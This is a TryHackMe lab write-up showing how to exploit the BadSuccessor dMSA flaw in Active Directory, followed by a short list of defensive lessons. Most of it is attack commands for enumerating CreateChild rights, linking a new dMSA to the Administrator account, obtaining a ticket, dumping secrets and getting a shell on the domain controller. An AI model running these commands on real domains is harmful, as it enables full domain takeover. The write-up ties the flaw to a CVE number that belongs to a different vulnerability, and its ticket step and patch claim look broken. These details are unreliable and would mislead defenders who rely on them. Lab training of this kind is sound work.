# 🏆 AD: BadSuccessor

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [AD: BadSuccessor](https://tryhackme.com/room/adbadsuccessor) |
| **Difficulty** | 🟡 Medium |
| **Category** | Active Directory |
| **OS** | Windows Server 2025 |
| **Tools** | nmap, BloodHound, PowerView, Impacket, evil-winrm |
| **CVE** | CVE-2025-29810 — dMSA BadSuccessor |

---

## 🎯 Objective

Exploit the BadSuccessor vulnerability to escalate privileges in Active Directory by abusing delegated Managed Service Account (dMSA) successor relationships.

---

## 📖 Vulnerability Overview

BadSuccessor (CVE-2025-29810) is a Windows Server 2025 privilege escalation vulnerability. When a delegated Managed Service Account (dMSA) is created with `msDS-ManagedAccountPrecededByLink` pointing to a privileged account (e.g. Domain Admin), the KDC grants the dMSA all of that account's privileges during authentication.

**Key requirement:** Any user with `CreateChild` rights on an Organizational Unit (OU) can exploit this — this is a delegated permission commonly granted to IT support staff.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p 88,389,445,636,3268,5985 TARGET_IP
```

Add to `/etc/hosts`:
```
TARGET_IP domain.local dc.domain.local
```

---

## 🩸 BloodHound — Find CreateChild Rights

```bash
bloodhound-python -u user -p password \
  -ns TARGET_IP -d domain.local -c all
```

Import data into BloodHound. Run custom query to find users with `CreateChild` on any OU:

```cypher
MATCH p=(u:User)-[:CreateChild]->(o:OU) RETURN p
```

---

## 💥 Exploitation

**Step 1 — Create a dMSA in the target OU:**

```powershell
# On Windows (RDP or evil-winrm)
New-ADServiceAccount -Name "evilDMSA" `
  -DNSHostName "evildmsa.domain.local" `
  -Path "OU=Target,DC=domain,DC=local" `
  -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"
```

**Step 2 — Set predecessor link to Domain Admin:**

```powershell
Set-ADServiceAccount -Identity "evilDMSA" `
  -Replace @{
    "msDS-ManagedAccountPrecededByLink" = `
    "CN=Administrator,CN=Users,DC=domain,DC=local"
  }
```

**Step 3 — Request TGT as dMSA (inherits DA privileges):**

```bash
# Using Impacket
getTGT.py -spn "evildmsa$" domain.local

# Or Python exploit tool (community-developed post-disclosure)
python3 badsuccessor.py -dc-ip TARGET_IP \
  domain.local/user:password
```

**Step 4 — Use ticket for DA access:**

```bash
export KRB5CCNAME=evildmsa.ccache
secretsdump.py -k -no-pass dc.domain.local
psexec.py -k -no-pass dc.domain.local
```

---

## 📚 Lessons Learned

- `CreateChild` on OUs is a commonly over-delegated permission — audit it regularly
- dMSA accounts should be monitored for unexpected `msDS-ManagedAccountPrecededByLink` modifications
- This CVE was disclosed May 2025 — patch with the relevant KB immediately on Windows Server 2025
- BloodHound custom queries are essential for finding non-obvious privilege escalation paths
- Tooling for this CVE is actively evolving — check GitHub for the latest PoC implementations

---
*by OwlRC 🦉 | github.com/OwlRC*
